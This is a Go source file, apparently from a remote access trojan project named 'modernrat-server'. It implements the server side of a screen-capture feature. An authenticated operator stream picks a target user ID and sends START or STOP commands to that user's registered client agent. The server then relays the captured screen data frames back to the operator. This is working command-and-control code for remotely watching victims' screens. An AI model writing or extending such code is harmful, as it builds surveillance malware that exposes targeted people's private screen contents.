package main

import (
	"errors"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	pb "modernrat-server/gen"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func (s *server) AdminCapture(stream pb.ScreenCaptureService_AdminCaptureServer) error {
	if err := s.authenticate(stream.Context()); err != nil {
		return err
	}

	adminConn := newCaptureAdminConnection(stream)
	defer adminConn.Close()
	defer s.cleanupAdminCapture(adminConn, "admin capture stream closed")

	for {
		msg, err := stream.Recv()
		if err == io.EOF {
			return nil
		}
		if err != nil {
			s.cleanupAdminCapture(adminConn, fmt.Sprintf("admin capture stream error: %v", err))
			return err
		}

		if err := s.handleAdminCaptureMessage(adminConn, msg); err != nil {
			if status.Code(err) == codes.Unavailable {
				return nil
			}
			return err
		}
	}
}

func (s *server) handleAdminCaptureMessage(adminConn *captureAdminConnection, msg *pb.ScreenCaptureMessage) error {
	switch msg.GetType() {
	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_START:
		return s.startCaptureSession(adminConn, msg)

	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP:
		return s.stopCaptureSession(adminConn, msg)

	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT:
		return nil

	default:
		return status.Error(codes.InvalidArgument, "unsupported admin capture message type")
	}
}

func (s *server) startCaptureSession(adminConn *captureAdminConnection, msg *pb.ScreenCaptureMessage) error {
	userID := strings.TrimSpace(msg.GetUserId())
	if userID == "" {
		return status.Error(codes.InvalidArgument, "user_id is required")
	}

	session, err := s.captureHub.startSession(userID, adminConn, msg.GetRequestId(), msg.GetSettings())
	if err != nil {
		notify := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
			UserId:    userID,
			RequestId: msg.GetRequestId(),
			Text:      "target user is not connected",
			Timestamp: time.Now().Unix(),
		}
		_ = adminConn.Send(notify)
		return status.Error(codes.Unavailable, "target user is not connected")
	}

	startMsg := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_START,
		SessionId: session.id,
		UserId:    userID,
		RequestId: msg.GetRequestId(),
		Settings:  msg.GetSettings(),
		Text:      strings.TrimSpace(msg.GetText()),
		Timestamp: time.Now().Unix(),
	}

	if err := session.clientConn.Send(startMsg); err != nil {
		s.captureHub.endSession(session.id)
		notify := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
			UserId:    userID,
			RequestId: msg.GetRequestId(),
			Text:      fmt.Sprintf("failed to reach client agent: %v", err),
			Timestamp: time.Now().Unix(),
		}
		_ = adminConn.Send(notify)
		return status.Error(codes.Unavailable, "failed to reach client agent")
	}

	return nil
}

func (s *server) stopCaptureSession(adminConn *captureAdminConnection, msg *pb.ScreenCaptureMessage) error {
	sessionID := strings.TrimSpace(msg.GetSessionId())
	userID := strings.TrimSpace(msg.GetUserId())

	var session *captureSession
	var ok bool

	if sessionID != "" {
		session, ok = s.captureHub.getSession(sessionID)
		if !ok {
			notify := &pb.ScreenCaptureMessage{
				Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
				UserId:    userID,
				RequestId: msg.GetRequestId(),
				SessionId: sessionID,
				Text:      "capture session not found",
				Timestamp: time.Now().Unix(),
			}
			_ = adminConn.Send(notify)
			return status.Error(codes.NotFound, "capture session not found")
		}
	} else if userID != "" {
		sessions := s.captureHub.sessionsForUser(userID)
		if len(sessions) == 0 {
			notify := &pb.ScreenCaptureMessage{
				Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
				UserId:    userID,
				RequestId: msg.GetRequestId(),
				Text:      "capture session not found",
				Timestamp: time.Now().Unix(),
			}
			_ = adminConn.Send(notify)
			return status.Error(codes.NotFound, "capture session not found")
		}
		session = sessions[0]
	} else {
		return status.Error(codes.InvalidArgument, "session_id or user_id required")
	}

	stopMsg := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP,
		SessionId: session.id,
		UserId:    session.userID,
		RequestId: msg.GetRequestId(),
		Text:      strings.TrimSpace(msg.GetText()),
		Timestamp: time.Now().Unix(),
	}

	if err := session.clientConn.Send(stopMsg); err != nil {
		s.captureHub.endSession(session.id)
		notify := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
			UserId:    session.userID,
			RequestId: msg.GetRequestId(),
			SessionId: session.id,
			Text:      fmt.Sprintf("failed to reach client agent: %v", err),
			Timestamp: time.Now().Unix(),
		}
		_ = adminConn.Send(notify)
		return status.Error(codes.Unavailable, "failed to reach client agent")
	}

	return nil
}

func (s *server) cleanupAdminCapture(adminConn *captureAdminConnection, reason string) {
	sessions := s.captureHub.endSessionsForAdmin(adminConn)
	if len(sessions) == 0 {
		return
	}

	for _, session := range sessions {
		stop := &pb.ScreenCaptureMessage{
			Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP,
			SessionId: session.id,
			UserId:    session.userID,
			Text:      reason,
			Timestamp: time.Now().Unix(),
		}
		if err := session.clientConn.Send(stop); err != nil {
			log.Printf("failed to notify client about capture stop: user=%s session=%s err=%v", session.userID, session.id, err)
		}
	}
}

func (s *server) ClientCapture(stream pb.ScreenCaptureService_ClientCaptureServer) error {
	first, err := stream.Recv()
	if err != nil {
		if err == io.EOF {
			return nil
		}
		return err
	}

	if first.GetType() != pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTER {
		return status.Error(codes.InvalidArgument, "first message must be REGISTER")
	}

	userID := strings.TrimSpace(first.GetUserId())
	if userID == "" {
		return status.Error(codes.InvalidArgument, "user_id is required")
	}

	clientConn := newCaptureClientConnection(userID, stream)
	defer clientConn.Close()

	orphaned := s.captureHub.registerClient(clientConn)
	if len(orphaned) > 0 {
		for _, session := range orphaned {
			notify := &pb.ScreenCaptureMessage{
				Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
				UserId:    session.userID,
				SessionId: session.id,
				Text:      "client reconnected",
				Timestamp: time.Now().Unix(),
			}
			_ = session.adminConn.Send(notify)
		}
	}

	ack := &pb.ScreenCaptureMessage{
		Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED,
		UserId:    userID,
		Text:      "screen capture channel ready",
		Timestamp: time.Now().Unix(),
	}
	_ = clientConn.Send(ack)

	for {
		msg, err := stream.Recv()
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Printf("capture client stream error: user=%s err=%v", userID, err)
			break
		}

		if err := s.handleClientCaptureMessage(clientConn, msg); err != nil {
			log.Printf("handle client capture message failed: user=%s err=%v", userID, err)
		}
	}

	ended := s.captureHub.unregisterClient(clientConn)
	if len(ended) > 0 {
		for _, session := range ended {
			notify := &pb.ScreenCaptureMessage{
				Type:      pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR,
				UserId:    session.userID,
				SessionId: session.id,
				Text:      "client disconnected",
				Timestamp: time.Now().Unix(),
			}
			_ = session.adminConn.Send(notify)
		}
	}

	return nil
}

func (s *server) handleClientCaptureMessage(conn *captureClientConnection, msg *pb.ScreenCaptureMessage) error {
	sessionID := strings.TrimSpace(msg.GetSessionId())
	if sessionID == "" {
		switch msg.GetType() {
		case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT,
			pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_REGISTERED:
			return nil
		default:
			return errors.New("capture session_id missing in client message")
		}
	}

	session, ok := s.captureHub.getSession(sessionID)
	if !ok {
		return errors.New("capture session not found for client message")
	}

	forward := protoCloneCaptureMessage(msg)
	forward.UserId = session.userID
	forward.SessionId = session.id
	forward.Timestamp = time.Now().Unix()

	switch msg.GetType() {
	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_READY,
		pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_DATA,
		pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_HEARTBEAT:
		if err := session.adminConn.Send(forward); err != nil {
			return fmt.Errorf("failed to send capture message to admin: %w", err)
		}
		return nil

	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_COMPLETE,
		pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_ERROR:
		if err := session.adminConn.Send(forward); err != nil {
			log.Printf("failed to send terminal capture message to admin: session=%s err=%v", session.id, err)
		}
		s.captureHub.endSession(session.id)
		return nil

	case pb.ScreenCaptureMessageType_SCREEN_CAPTURE_MESSAGE_TYPE_STOP:
		// Treat STOP from client as terminal and end the session.
		if err := session.adminConn.Send(forward); err != nil {
			log.Printf("failed to forward stop message to admin: session=%s err=%v", session.id, err)
		}
		s.captureHub.endSession(session.id)
		return nil

	default:
		return fmt.Errorf("unsupported client capture message type: %v", msg.GetType())
	}
}

func protoCloneCaptureMessage(src *pb.ScreenCaptureMessage) *pb.ScreenCaptureMessage {
	if src == nil {
		return nil
	}
	clone := *src
	if src.Settings != nil {
		settingsCopy := *src.Settings
		clone.Settings = &settingsCopy
	}
	if src.Data != nil {
		clone.Data = append([]byte(nil), src.Data...)
	}
	return &clone
}
